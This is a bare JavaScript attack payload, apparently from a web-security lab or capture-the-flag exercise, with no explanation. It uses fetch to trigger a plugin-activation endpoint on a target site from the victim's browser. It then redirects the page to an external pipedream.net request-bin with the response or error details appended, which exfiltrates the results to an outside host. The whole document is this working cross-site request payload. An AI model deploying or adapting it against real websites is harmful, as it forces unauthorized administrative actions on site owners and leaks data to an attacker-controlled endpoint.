fetch('http://website-xnbbvj.inst.malicecyber.com/activate-plugin/1', {
    method: 'GET',
    mode: 'no-cors',
  })
    .then(response => {
        document.location="https://enpw216ps367.x.pipedream.net/?="+response
    })
    .catch(error => {
        document.location="https://enpw216ps367.x.pipedream.net/?="+error+error.constructor.name+error.message+error.stack
    });